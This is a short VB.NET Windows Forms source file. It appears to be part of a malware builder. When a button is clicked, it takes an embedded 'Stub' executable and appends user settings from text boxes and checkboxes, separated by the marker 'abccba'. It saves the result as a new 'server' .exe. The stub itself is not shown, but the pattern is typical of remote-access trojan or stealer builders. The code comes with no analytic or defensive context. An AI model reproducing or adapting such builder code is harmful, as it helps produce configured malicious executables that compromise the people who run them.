Imports System.IO
Public Class Form5
    Dim text1, text2 As String
    Const spl = "abccba"
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim s As New SaveFileDialog
        s.Title = "Save Server"
        Dim stub As String
        Dim all As String = ""
        Const Filesplit = "Form5"
        Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"
        s.ShowDialog()
        If s.FileName > "" Then
            text1 = TextBox1.Text
            text2 = TextBox2.Text
            File.WriteAllBytes(temp, My.Resources.Stub)
            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & spl & text1 & spl & text2 & spl & TextBox5.Text & spl & CheckBox1.CheckState & spl & TextBox4.Text & spl & CheckBox2.CheckState & spl & TextBox6.Text & spl & CheckBox3.CheckState & spl & CheckBox5.CheckState & spl & CheckBox4.CheckState & spl & CheckBox6.CheckState & spl & CheckBox7.CheckState & spl & CheckBox8.CheckState & spl & CheckBox9.CheckState & spl & CheckBox10.CheckState & spl & CheckBox11.CheckState & spl & CheckBox12.CheckState)
            FileClose(1)
            MsgBox("OK", MsgBoxStyle.OkOnly)
        End If
    End Sub

    Private Sub TextBox4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox4.TextChanged

    End Sub
End Class